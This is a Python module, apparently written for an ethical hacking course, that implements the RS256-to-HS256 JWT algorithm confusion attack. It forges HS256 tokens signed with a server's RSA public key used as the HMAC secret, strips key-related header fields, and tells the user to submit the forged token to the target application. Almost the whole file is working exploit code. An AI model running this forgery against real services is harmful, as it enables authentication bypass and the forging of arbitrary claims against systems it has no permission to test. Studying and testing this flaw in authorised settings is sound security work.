"""
alg_confusion.py - RS256 -> HS256 algorithm confusion attack

exploits servers that do not explicitly enforce which algorithm they 
expect

how it works:
    1. the server normally verifies tokens signed with RS256, using
       its RSA public key. the public key is not secret
    2. an attacker takes the server's public key and uses it as the
       HMAC secret to sign a forged token declaring alg: HS256
    3. a vulnerable server sees alg: HS256 in the header, grabs its
       own public key (which it uses for RS256 verification), and
       uses it as the HMAC secret to verify the signature
    4. since both sides are now doing HMAC with the same key (the
       public key), the signature verifies correctly

basically this is CVE-2015-9235 in its algorithm confusion form

requires: cryptography

Author: Patrick Earley
Module: CMP320 Advanced Ethical Hacking
"""

import base64
import json
import hmac
import hashlib

try:
    from cryptography.hazmat.primitives.serialization import load_pem_public_key
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False


def _b64url_encode(data):
    # encode a dict or bytes to Base64URL without padding
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _load_public_key_bytes(pubkey_path):
    """
    load an RSA public key from a PEM file and return the raw PEM bytes.

    we need the raw bytes because we use the public key as the HMAC
    secret directly - not as a cryptographic key object.

    returns (pem_bytes, error_message). one of these will be None.
    """
    try:
        with open(pubkey_path, 'rb') as f:
            pem_bytes = f.read()
        # validate it actually loads as a public key
        load_pem_public_key(pem_bytes, backend=default_backend())
        return pem_bytes, None
    except FileNotFoundError:
        return None, f"Public key file not found: '{pubkey_path}'"
    except Exception as e:
        return None, f"Failed to load public key: {e}"


def _forge_token(header, payload, pubkey_bytes):
    """
    forge a new HS256-signed token using the RSA public key as the secret.

    modifies the header to declare HS256, re-encodes both segments,
    then signs the result with HMAC-SHA256 using the raw PEM bytes
    of the public key as the secret.
    """
    # swap the algorithm to HS256
    forged_header = {**header, 'alg': 'HS256'}

    # remove any key-related header parameters that might interfere
    for param in ['kid', 'jku', 'jwk', 'x5u', 'x5c']:
        forged_header.pop(param, None)

    header_b64  = _b64url_encode(forged_header)
    payload_b64 = _b64url_encode(payload)
    signing_input = f"{header_b64}.{payload_b64}"

    # sign with HMAC-SHA256 using the public key PEM bytes as secret
    sig = hmac.new(
        pubkey_bytes,
        signing_input.encode('utf-8'),
        hashlib.sha256
    ).digest()

    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
    return f"{signing_input}.{sig_b64}"


def analyse(decoded, pubkey_path=None):
    """
    attempt the RS256 -> HS256 algorithm confusion attack.

    checks whether the token is RS256-signed, loads the provided
    public key, and generates a forged HS256 token signed with
    the public key as the HMAC secret.

    args in are the output of decoder.decode() and an optional path
    to the RSA public key PEM file. returns a list of finding dicts.
    if successful, the finding includes a 'forged_token' field.
    """
    findings = []
    algorithm = decoded['algorithm']

    # check cryptography library is available
    if not CRYPTO_AVAILABLE:
        findings.append({
            'severity': 'INFO',
            'title': "cryptography library not available",
            'description': (
                "The algorithm confusion attack requires the 'cryptography' "
                "library. Install it with: pip install cryptography"
            )
        })
        return findings

    # only applicable to asymmetric algorithms
    ASYMMETRIC_ALGOS = {'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256'}
    if algorithm not in ASYMMETRIC_ALGOS:
        findings.append({
            'severity': 'INFO',
            'title': f"Algorithm confusion not applicable for {algorithm}",
            'description': (
                f"{algorithm} is not an asymmetric algorithm. This attack "
                f"requires an RSA or ECDSA signed token."
            )
        })
        return findings

    # flag that the token uses an asymmetric algorithm regardless
    findings.append({
        'severity': 'INFO',
        'title': f"Token uses asymmetric algorithm: {algorithm}",
        'description': (
            f"The token is signed with {algorithm}. If the server's public "
            f"key is obtainable (e.g. from a JWKS endpoint or TLS certificate), "
            f"the algorithm confusion attack may be viable."
        )
    })

    # no public key provided - generate the finding but can't forge
    if not pubkey_path:
        findings.append({
            'severity': 'INFO',
            'title': "No public key provided - cannot forge token",
            'description': (
                "To attempt the algorithm confusion attack, provide the "
                "server's RSA public key with the -k / --pubkey argument. "
                "The public key can often be obtained from the server's "
                "JWKS endpoint (e.g. /.well-known/jwks.json) or its TLS certificate."
            )
        })
        return findings

    # load the public key
    pubkey_bytes, error = _load_public_key_bytes(pubkey_path)
    if error:
        findings.append({
            'severity': 'INFO',
            'title': "Failed to load public key",
            'description': error
        })
        return findings

    # forge the token
    forged = _forge_token(decoded['header'], decoded['payload'], pubkey_bytes)

    findings.append({
        'severity': 'HIGH',
        'title': "Algorithm confusion token forged (RS256 -> HS256)",
        'description': (
            f"A forged HS256 token has been generated using the provided "
            f"RSA public key as the HMAC secret. Submit this token to the "
            f"target application. If accepted, the server is vulnerable to "
            f"the algorithm confusion attack - an attacker with the public "
            f"key can forge arbitrary tokens with any claims they choose."
        ),
        'forged_token': forged
    })

    return findings